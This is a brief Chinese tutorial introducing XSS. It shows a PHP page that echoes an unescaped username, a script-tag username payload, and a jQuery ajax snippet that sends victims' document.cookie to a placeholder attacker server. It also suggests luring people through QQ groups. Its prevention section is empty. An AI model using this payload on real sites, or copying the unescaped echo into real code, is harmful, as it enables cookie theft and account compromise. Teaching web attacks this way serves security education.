
## 概念

XSS是最常见的一种web攻击方式，它指的是恶意用户把代码注入到其他用户要访问的网站中。

站在前端的角度，可以理解为将js代码注入。

```php
<?php
    $username="鹏仔";
?>
<!DOCYTPE HTML>
<html>
    <head>
        <meta charset="utf-8" />
    </head>
    <body>
        <div>
            用户名：<?php echo $username;?>
        </div>
        <div>
            第一条状态：侯医生的状态1
        </div>
        <div>
            第二条状态：侯医生的状态2
        </div>
        <div>
            第三条状态：侯医生的状态3
        </div>
    </body>
</html>
```

如果你的用户名，起名称的时候，带上script标签呢？我们知道，浏览器遇到html中的script标签的时候，会解析并执行标签中的js脚本代码，那么如果你的用户名称里面含有script标签的话，就可以执行其中的代码了。代码如下：

```php
<?php
    $username="<script>alert('侯医生');</script>";
?>
```

如果你将自己的用户名设定为这种执行脚本的方式，再让别人去访问你的连接的话，就可以达到在他人web环境中，执行自己脚本的效果了。我们还可以使用ajax，将其他用户在当前域名下的cookie获取并发送到自己的服务器上。这样就可以获取他人信息了。比如，刚刚咱们使用的不是alert而是，如下的代码：

```js
$.ajax({
    url: '自己的服务器',
    dataType: 'jsonp',
    data: {'盗取的用户cookie': document.cookie}
});
```
再在各个QQ群中，散播自己的空间，引诱别人来访问。就可以拿到用户在这个域名下的cookie或者其他隐私了。

## 防范





